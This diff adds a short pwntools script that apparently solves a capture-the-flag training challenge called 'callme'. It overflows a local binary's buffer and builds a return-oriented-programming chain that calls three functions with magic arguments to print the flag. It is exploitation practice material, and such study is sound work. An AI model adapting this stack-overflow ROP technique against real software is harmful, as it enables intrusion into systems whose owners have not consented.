@@ -1,0 +1,16 @@
+from pwn import *
+context(os='linux',arch='amd64')
+p = process('./callme')
+#p = gdb.debug('./callme', 'b main')
+junk = b'A'*40
+e = ELF('./callme')
+p.readuntil(b'> ')
+r = ROP(e)
+r.call(e.symbols['callme_one'], [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])
+r.call(e.symbols['callme_two'], [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])
+r.call(e.symbols['callme_three'], [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])
+print(r.dump())
+p.sendline(junk + r.chain())
+p.recvuntil(b'callme_two() called correctly\n')
+flag = p.recvline().decode('utf-8')
+print(flag)
